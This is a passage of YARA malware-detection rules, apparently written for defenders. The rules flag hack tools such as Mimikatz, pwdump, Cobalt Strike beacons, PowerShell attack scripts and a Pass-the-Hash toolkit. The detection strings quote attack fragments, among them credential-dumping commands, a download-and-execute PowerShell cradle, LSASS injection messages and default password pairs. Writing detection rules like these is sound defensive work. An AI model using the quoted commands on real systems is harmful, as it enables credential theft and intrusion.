		$s3 = "&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=" ascii
		$s4 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" fullword ascii
	condition:
		( uint16(0) == 0x7566 and filesize < 60KB and 2 of them ) or $x1
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-08-01
	Identifier: FHScan - Web Vulnerability Scanner
*/

/* Rule Set ----------------------------------------------------------------- */

rule FHScan_Web_Vulnerability_Scanner {
	meta:
		description = "Detects FHScan Web Vuln Scanner Component - file FHScan.exe"
		author = "Florian Roth"
		reference = "FHScan Tool Analysis"
		date = "2016-08-01"
		score = 100
		hash1 = "1fbec6fab9318ac1f119016593eaf2f85791828ff3a4bf13f55a4854608a6b51"
	strings:
		$x1 = "c:\\fscan\\Release\\sslscanner.pdb" fullword ascii
		$x2 = "[+] Scanning %i ports - bruteforce is %s" fullword ascii
		$x3 = "User-Agent: Mozilla/5.0 (FHScan Core 1.1)" fullword ascii
		$x4 = "[+] Loaded %i user/pass combinations" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 3000KB and 1 of ($x*) )
}

rule FHScan_KnownWebservers {
	meta:
		description = "Detects FHScan Web Vuln Scanner Component - file KnownWebservers.ini"
		author = "Florian Roth"
		reference = "FHScan Tool Analysis"
		date = "2016-08-01"
		score = 100
		hash1 = "9fcd7c322ce612fe353a99eaa223e1a00a1b761523a75b2e52eae36fc5072220"
	strings:
		$s1 = "(c) 2007 - Andres Tarasco  (atarasco_at_gmail.com)" fullword ascii
	condition:
		( uint16(0) == 0x4623 and filesize < 10KB and all of them )
}

rule FHScan_ZIP {
	meta:
		description = "Detects FHScan Web Vuln Scanner Component - file fscan_1.1.23.zip"
		author = "Florian Roth"
		reference = "FHScan Tool Analysis"
		date = "2016-08-01"
		score = 100
		hash1 = "1a7fd2f78a26ab7d2e308d7507ffd8c60c5d32400e92acb2d0141c9d0624db6b"
	strings:
		$s3 = "fscan_1.1.23/FHScan.exe" fullword ascii
	condition:
		( uint16(0) == 0x4b50 and filesize < 3000KB and all of them )
}

rule FHScan_Web_Vulnerability_Scanner_gui {
	meta:
		description = "Detects FHScan Web Vuln Scanner Component - file FHScan_gui.exe"
		author = "Florian Roth"
		reference = "FHScan Tool Analysis"
		date = "2016-08-01"
		score = 100
		hash1 = "1a6f160b36168989e5e6b2dab6abbfe9763d8b3fd34f20335ce82e1e6bc89539"
	strings:
		$x1 = "http://www.tarasco.org/security" fullword ascii
		$x2 = "FHScan.exe --csv --verbose" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 3000KB and 1 of ($x*) )
}

rule UserListMulti_simple {
	meta:
		description = "Detects FHScan Web Vuln Scanner Component - file UserListMulti-simple.ini"
		author = "Florian Roth"
		reference = "FHScan Tool Analysis"
		date = "2016-08-01"
		score = 80
		hash1 = "ccf0dc473118d2bd8495eee29c8e2ebcbe8f05275d495f72dc602f60b1a064bb"
	strings:
		$s1 = "user:password" fullword ascii
		$s2 = "admin:password" fullword ascii
		$s3 = "root:admin" fullword ascii
		$s4 = "support:support" fullword ascii
		$s5 = "admin:123456" fullword ascii
		$s6 = "admin:12345" fullword ascii
		$s7 = "manager:manager" fullword ascii
		$s8 = "Admin:Admin" fullword ascii
	condition:
		filesize < 1KB and 6 of ($s*)
}

rule WCE_in_memory {
	meta:
		description = "Detects Windows Credential Editor (WCE) in memory (and also on disk)"
		author = "Florian Roth"
		reference = "Internal Research"
		score = 80
		date = "2016-08-28"
	strings:
		$s1 = "wkKUSvflehHr::o:t:s:c:i:d:a:g:" fullword ascii
		$s2 = "wceaux.dll" fullword ascii
	condition:
		all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-09-04
	Identifier: PowerShell Toolset - Cloaked
*/

/* Rule Set ----------------------------------------------------------------- */

rule ps1_toolkit_PowerUp {
	meta:
		description = "Auto-generated rule - file PowerUp.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad"
	strings:
		$s1 = "iex \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list vdir /text:vdir.name\" | % { " fullword ascii
		$s2 = "iex \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list apppools /text:name\" | % { " fullword ascii
		$s3 = "if ($Env:PROCESSOR_ARCHITECTURE -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AA==')))) {" fullword ascii
		$s4 = "C:\\Windows\\System32\\InetSRV\\appcmd.exe list vdir /text:physicalpath | " fullword ascii
		$s5 = "if (Test-Path  (\"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe\"))" fullword ascii
		$s6 = "if (Test-Path  (\"$Env:SystemRoot\\System32\\InetSRV\\appcmd.exe\")) {" fullword ascii
		$s7 = "Write-Verbose \"Executing command '$Cmd'\"" fullword ascii
		$s8 = "Write-Warning \"[!] Target service" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 4000KB and 1 of them ) or ( 3 of them )
}

rule ps1_toolkit_Inveigh_BruteForce {
	meta:
		description = "Auto-generated rule - file Inveigh-BruteForce.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
	strings:
		$s1 = "Import-Module .\\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 " fullword ascii
		$s2 = "$(Get-Date -format 's') - Attempting to stop HTTP listener\")|Out-Null" fullword ascii
		$s3 = "Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 300KB and 1 of them ) or ( 2 of them )
}

rule ps1_toolkit_Invoke_Shellcode {
	meta:
		description = "Auto-generated rule - file Invoke-Shellcode.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "24abe9f3f366a3d269f8681be80c99504dea51e50318d83ee42f9a4c7435999a"
	strings:
		$s1 = "Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
		$s2 = "Get-ProcAddress kernel32.dll OpenProcess" fullword ascii
		$s3 = "msfpayload windows/exec CMD=\"cmd /k calc\" EXITFUNC=thread C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | cut -c2- " fullword ascii
		$s4 = "inject shellcode into" ascii
		$s5 = "Injecting shellcode" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 90KB and 1 of them ) or ( 3 of them )
}

rule ps1_toolkit_Invoke_Mimikatz {
	meta:
		description = "Auto-generated rule - file Invoke-Mimikatz.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "5c31a2e3887662467cfcb0ac37e681f1d9b0f135e6dfff010aae26587e03d8c8"
	strings:
		$s1 = "Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
		$s2 = "ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId" fullword ascii
		$s3 = "privilege::debug exit" ascii
		$s4 = "Get-ProcAddress Advapi32.dll AdjustTokenPrivileges" fullword ascii
		$s5 = "Invoke-Mimikatz -DumpCreds" fullword ascii
		$s6 = "| Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 10000KB and 1 of them ) or ( 3 of them )
}

rule ps1_toolkit_Invoke_RelfectivePEInjection {
	meta:
		description = "Auto-generated rule - file Invoke-RelfectivePEInjection.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "510b345f821f93c1df5f90ac89ad91fcd0f287ebdabec6c662b716ec9fddb03a"
	strings:
		$x1 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)" fullword ascii
		$x2 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local" fullword ascii
		$x3 = "} = Get-ProcAddress Advapi32.dll OpenThreadToken" ascii
		$x4 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local" fullword ascii
		$s5 = "$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')" fullword ascii
		$s6 = "= Get-ProcAddress Advapi32.dll AdjustTokenPrivileges" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 700KB and 2 of them ) or ( all of them )
}

rule ps1_toolkit_Persistence {
	meta:
		description = "Auto-generated rule - file Persistence.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd"
	strings:
		$s1 = "\"`\"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```\"root\\subscription```" ascii
		$s2 = "}=$PROFILE.AllUsersAllHosts;${" ascii
		$s3 = "C:\\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup"  ascii
		$s4 = "= gwmi Win32_OperatingSystem | select -ExpandProperty OSArchitecture"  ascii
		$s5 = "-eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA='))))"  ascii
		$s6 = "}=$PROFILE.CurrentUserAllHosts;${"  ascii
		$s7 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
		$s8 = "[System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection {
	meta:
		description = "Auto-generated rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		super_rule = 1
		hash1 = "5c31a2e3887662467cfcb0ac37e681f1d9b0f135e6dfff010aae26587e03d8c8"
		hash2 = "510b345f821f93c1df5f90ac89ad91fcd0f287ebdabec6c662b716ec9fddb03a"
	strings:
		$s1 = "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
		$s2 = "if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)" fullword ascii
		$s3 = "[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)" fullword ascii
		$s4 = "Function Import-DllInRemoteProcess" fullword ascii
		$s5 = "FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))" fullword ascii
		$s6 = "[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)" fullword ascii
		$s7 = "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)" fullword ascii
		$s8 = "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null" fullword ascii
		$s9 = "::FromBase64String('RABvAG4AZQAhAA==')))" ascii
		$s10 = "Write-Verbose \"PowerShell ProcessID: $PID\"" fullword ascii
		$s11 = "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 10000KB and 3 of them ) or ( 6 of them )
}

rule ps1_toolkit_Inveigh_BruteForce_2 {
	meta:
		description = "Auto-generated rule - from files Inveigh-BruteForce.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
	strings:
		$s1 = "}.NTLMv2_file_queue[0]|Out-File ${" ascii
		$s2 = "}.NTLMv2_file_queue.RemoveRange(0,1)" ascii
		$s3 = "}.NTLMv2_file_queue.Count -gt 0)" ascii
		$s4 = "}.relay_running = $false" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_PowerUp_2 {
	meta:
		description = "Auto-generated rule - from files PowerUp.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad"
	strings:
		$s1 = "if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::" ascii
		$s2 = "FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {" ascii
		$s3 = "$Null = Invoke-ServiceStart" ascii
		$s4 = "Write-Warning \"[!] Access to service $" ascii
		$s5 = "} = $MyConString.Split(\"=\")[1].Split(\";\")[0]" ascii
		$s6 = "} += \"net localgroup ${" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Persistence_2 {
	meta:
		description = "Auto-generated rule - from files Persistence.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd"
	strings:
		$s1 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
		$s2 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')" ascii
		$s3 = "FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')" ascii
		$s4 = "[Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]" ascii
		$s5 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))" ascii
		$s6 = "[Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]" fullword ascii
		$s7 = "FromBase64String('TQBlAHQAaABvAGQA')" ascii
		$s8 = "FromBase64String('VAByAGkAZwBnAGUAcgA=')" ascii
		$s9 = "[Runtime.InteropServices.CallingConvention]::Winapi," fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Inveigh_BruteForce_3 {
	meta:
		description = "Auto-generated rule - from files Inveigh-BruteForce.ps1"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash3 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
	strings:
		$s1 = "::FromBase64String('TgBUAEwATQA=')" ascii
		$s2 = "::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))" ascii
		$s3 = "::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))" ascii
		$s4 = "::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))" ascii
		$s5 = "[Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`" fullword ascii
		$s6 = "KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA" ascii
		$s7 = "}.bruteforce_running)" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule pstgdump {
	meta:
		description = "Detects a tool used by APT groups - file pstgdump.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/igxLyF"
		date = "2016-09-08"
		hash1 = "65d48a2f868ff5757c10ed796e03621961954c523c71eac1c5e044862893a106"
	strings:
		$x1 = "\\Release\\pstgdump.pdb" ascii
		$x2 = "Failed to dump all protected storage items - see previous messages for details" fullword ascii
		$x3 = "ptsgdump [-h][-q][-u Username][-p Password]" fullword ascii
		$x4 = "Attempting to impersonate domain user '%s' in domain '%s'" fullword ascii
		$x5 = "Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d" fullword ascii
		$x6 = "Unable to obtain handle to PStoreCreateInstance in pstorec.dll" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule lsremora {
	meta:
		description = "Detects a tool used by APT groups"
		author = "Florian Roth"
		reference = "http://goo.gl/igxLyF"
		date = "2016-09-08"
		hash1 = "efa66f6391ec471ca52cd053159c8a8778f11f921da14e6daf76387f8c9afcd5"
		hash2 = "e0327c1218fd3723e20acc780e20135f41abca35c35e0f97f7eccac265f4f44e"
	strings:
		$x1 = "Target: Failed to load primary SAM functions." fullword ascii
		$x2 = "lsremora64.dll" fullword ascii
		$x3 = "PwDumpError:999999" fullword wide
		$x4 = "PwDumpError" fullword wide
		$x5 = "lsremora.dll" fullword ascii

		$s1 = ":\\\\.\\pipe\\%s" fullword ascii
		$s2 = "x%s_history_%d:%d" fullword wide
		$s3 = "Using pipe %s" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule servpw {
	meta:
		description = "Detects a tool used by APT groups - file servpw.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/igxLyF"
		date = "2016-09-08"
		hash1 = "97b39ac28794a7610ed83ad65e28c605397ea7be878109c35228c126d43e2f46"
		hash2 = "0f340b471ef34c69f5413540acd3095c829ffc4df38764e703345eb5e5020301"
	strings:
		$s1 = "Unable to open target process: %d, pid %d" fullword ascii
		$s2 = "LSASS.EXE" fullword wide
		$s3 = "WriteProcessMemory failed: %d" fullword ascii
		$s4 = "lsremora64.dll" fullword ascii
		$s5 = "CreateRemoteThread failed: %d" fullword ascii
		$s6 = "Thread code: %d, path: %s" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 200KB and 3 of them ) or ( all of them )
}

rule fgexec {
	meta:
		description = "Detects a tool used by APT groups - file fgexec.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/igxLyF"
		date = "2016-09-08"
		hash1 = "8697897bee415f213ce7bc24f22c14002d660b8aaffab807490ddbf4f3f20249"
	strings:
		$x1 = "\\Release\\fgexec.pdb" ascii
		$x2 = "fgexec Remote Process Execution Tool" fullword ascii
		$x3 = "fgexec CallNamedPipe failed" fullword ascii
		$x4 = "fizzgig and the mighty foofus.net team" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 100KB and 1 of ($x*) ) or ( 3 of them )
}

rule cachedump {
	meta:
		description = "Detects a tool used by APT groups - from files cachedump.exe, cachedump64.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/igxLyF"
		date = "2016-09-08"
		super_rule = 1
		hash1 = "cf58ca5bf8c4f87bb67e6a4e1fb9e8bada50157dacbd08a92a4a779e40d569c4"
		hash2 = "e38edac8c838a043d0d9d28c71a96fe8f7b7f61c5edf69f1ce0c13e141be281f"
	strings:
		$s1 = "Failed to open key SECURITY\\Cache in RegOpenKeyEx. Is service running as SYSTEM ? Do you ever log on domain ? " fullword ascii
		$s2 = "Unable to open LSASS.EXE process" fullword ascii
		$s3 = "Service not found. Installing CacheDump Service (%s)" fullword ascii
		$s4 = "CacheDump service successfully installed." fullword ascii
		$s5 = "Kill CacheDump service (shouldn't be used)" fullword ascii
		$s6 = "cacheDump [-v | -vv | -K]" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )
}

rule PwDump_B {
	meta:
		description = "Detects a tool used by APT groups - file PwDump.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/igxLyF"
		date = "2016-09-08"
		hash1 = "3c796092f42a948018c3954f837b4047899105845019fce75a6e82bc99317982"
	strings:
		$x1 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName" fullword ascii
		$x2 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword ascii
		$x3 = "where -x targets a 64-bit host" fullword ascii
		$x4 = "Couldn't delete target executable from remote machine: %d" fullword ascii

		$s1 = "lsremora64.dll" fullword ascii
		$s2 = "lsremora.dll" fullword ascii
		$s3 = "servpw.exe" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 400KB and 1 of ($x*) ) or ( 3 of them )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-09-15
	Identifier: XNet
*/

/* Rule Set ----------------------------------------------------------------- */

rule XNet_Reduced_NbtScan {
	meta:
		description = "Detects a reduced version of NbtScan called XNet"
		author = "Florian Roth"
		reference = "Internal Research"
		date = "2016-09-15"
		score = 100
		hash1 = "af3e86d7e67b6497032d265622a2b298430db03ea2f40dba885827dd15d106ed"
	strings:
		$x1 = "\\Release\\Win32\\XNet.pdb" fullword ascii
		$x2 = "Usage: XNet.exe  192.168.0.0  192.168.255.255" fullword ascii

		$s1 = "Browser Service Elections" fullword ascii
		$s2 = "Dr. Solomon AV Management" fullword ascii
		$s3 = "U=%s%s%s" fullword ascii
		$s4 = "Cleaning up WinSocket ..." fullword ascii
		$s5 = " SHARING" fullword ascii
		$s6 = "%-15s %-31s" fullword ascii

		$orig1 = "generate results in perl hashref format" fullword ascii
	condition:
		( ( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of ($x*) ) or ( 4 of them ) )
		and not $orig1
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-09-16
	Identifier: Mimikatz Sep 16
*/

/* Rule Set ----------------------------------------------------------------- */

rule Mimikatz_LowDetection_Sep16 {
	meta:
		description = "Detects Mimikatz Hack Tool"
		author = "Florian Roth"
		reference = "Internal Research"
		date = "2016-09-16"
		score = 100
		hash1 = "072bbbdf0473fa5457c004c8016655ccac126f30320c4f40e11df11089481559"
		hash2 = "eb28f9e0163bb463b6ae10c3600280720c9722503700664d17fa576cdafd72f1"
	strings:
		$x1 = "%*s**CREDENTIAL**" wide
		$x2 = "%*s  Persist        : %08x - %u - %s" wide
		$x3 = "%*s**LEGACY CREDENTIALS GROUP**" wide
		$x4 = "%*s**DOMAINKEY**" wide
		$x5 = "ERROR kull_m_net_getDC ; DsGetDcName: %u" wide
		$x6 = "ERROR mimikatz_initOrClean ; CoInitializeEx: %08x" wide
		$x7 = "   * KiRBi to file     :" wide ascii
		$x8 = "Golden ticket for '%s @ %s' successfully submitted for current session" wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of ($x*) ) or ( 2 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-10-15
   Identifier: Cloaked Mimikatz Versions
*/

/* Rule Set ----------------------------------------------------------------- */

rule Cloaked_Mimikatz_Version_1 {
   meta:
      description = "Signature written for a cloaked version of Mimikatz"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-15"
      hash1 = "68c79855fc0281e7136622e51606d691acf3d12ad721a8405b181e3e05616c64"
   strings:
      $x1 = "42mz7uB1ORfojQVOU2eBbavuAshvuCCh9xP7kKYC9sDLlNzbv" wide
      $s3 = "katz.exe" fullword wide
      $s4 = "Mimikatz .net 2.0 encrypted - singed by ZC" fullword wide
      $s5 = "Executing Mimikatz" fullword wide

      $op0 = { 86 18 9a 01 45 00 06 00 88 2a } /* Opcode */
      $op1 = { a3 a1 e8 9c 58 f0 ba 9d 9f fb 0f fe 90 f4 82 57 } /* Opcode */
      $op2 = { 96 00 c9 01 21 00 02 00 27 21 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and 1 of ($x*) ) or
      ( 3 of ($s*) or all of ($op*) )
}

rule Cloaked_Mimikatz_Version_2 {
   meta:
      description = "Signature written for a cloaked version of Mimikatz"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-15"
      hash1 = "9474d076de44d23656e6fdec6e295d0160fbe4482107656358b13f08e80aa286"
   strings:
      $x1 = "tgRbjt6VdxRfMvBgDCJUVREQxuBQPDgKj5lNWda2yknypQN3" wide
      $x2 = "katz.exe" fullword wide
      $x3 = "Win32/mimikatz.exe" fullword wide
      $x4 = "x64/mimikatz.exe" fullword wide
      $x5 = "Executing Mimikatz" fullword wide
      $s1 = "<PrivateImplementationDetails>{6F54794E-0C08-4F79-85C1-809DE824942A}" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and 1 of ($x*) ) or ( 2 of them )
}

rule Cloaked_Mimikatz_Version_3 {
   meta:
      description = "Signature written for a cloaked version of Mimikatz"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-15"
      hash1 = "4d0b5eb2a826e6fbfe8021205ffc9cc89b8dd801d58fecf38dc31113daa727d8"
   strings:
      $s1 = "pvqalzpo" fullword ascii
      $s2 = "jvuolptp" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and all of them )
}

rule Cloaked_Mimikatz_Version_4 {
   meta:
      description = "Signature written for a cloaked version of Mimikatz"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-10-15"
      hash1 = "81786c71551cc3e9e11ef3e7b3ccdef952de9350f04525e15490b1d8273a552f"
   strings:
      $x1 = "\\ReflectivePELoader\\obj\\" ascii
      $s1 = "Unable to write DLL path to remote process memory" fullword wide
      $s2 = "Unable to write shellcode to remote process memory." fullword wide
      $s3 = "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and $x1 ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-11-05
   Identifier: CobaltStrike
*/

/* Rule Set ----------------------------------------------------------------- */

rule Detects_CobaltStrike_Agents {
   meta:
      description = "Detects CobalStrike - Adversay Simulation / Red Team Operation software agent"
      author = "Florian Roth"
      reference = "https://www.cobaltstrike.com/"
      date = "2016-11-05"
      hash1 = "f69cce568cfaab0d775b0480d091a039a559b0ac76ca56897509c232788f1b2b"
      hash2 = "fd240eebe1a2e1962fb86f21be51d6d228fa1137bfa2f3c9a46151abf69a23ee"
      hash3 = "355f7eef17b1ebc8e6541ff8a5497f054c60188d1486c4936915f163ae3f8fa9"
      hash4 = "4ef4b498faa2417ecfe9e1b0c146df1e9c1906ee14ece4becb833e978a35f8cf"
      hash5 = "bcc6994bc1e512370fc2a34e95226a8189c002d04fc890c6100df38665783a56"
   strings:
      $s1 = "\\\\%s\\pipe\\msagent_%x" fullword ascii
      $s2 = "\\beacon\\Release\\beacon.pdb" ascii
      $s3 = "beacon.dll" fullword ascii
      $s4 = "cdn.%x%x.%s" ascii fullword
      $s5 = "api.%x%x.%s" ascii fullword
      $s6 = "could not spawn %s (token): %d" ascii fullword
      $s7 = "BypassUAC is for Windows 7 and later" fullword ascii
      $s8 = "%d is an x86 process (can't inject x64 content)" fullword ascii
      $s9 = "Failed to impersonate token from %d (%u)" fullword ascii
      $s10 = "kerberos ticket purge failed: %08x"

      $p1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $p2 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 2 of them ) or ( 3 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-12-06
   Identifier: PassTheHash Toolkit
*/

/* Rule Set ----------------------------------------------------------------- */

rule PTH_TK_1_iamalt {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file iam-alt.exe"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90"
   strings:
      $x2 = "Error in cmdline!. Bye!." fullword ascii
      $x3 = "Error: Cannot open LSASS.EXE!." fullword ascii
      $x4 = ".\\pth.dll" fullword ascii
      $x5 = "username:domainname:lmhash:nthash" fullword ascii
      $x6 = "hochoa Exp $" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule PTH_TK_1_whoisthere {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file whosthere-alt.exe"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de"
   strings:
      $x1 = "Error in InjectDllAndCallFunction" fullword ascii
      $x2 = "username:domain:lmhash:nthash" fullword ascii
      $x3 = "Cannot get LSASS.EXE PID!" fullword ascii
      $x4 = "Can't enumerate logon sessions!" fullword ascii
      $x5 = "LSASS HANDLE: %x" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule PTH_TK_1 {
   meta:
      description = "PassTheHash Toolkit CoreSecurity - file pth.dll"
      author = "Florian Roth"
      reference = "https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit"
      date = "2016-12-06"
      hash1 = "fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0"
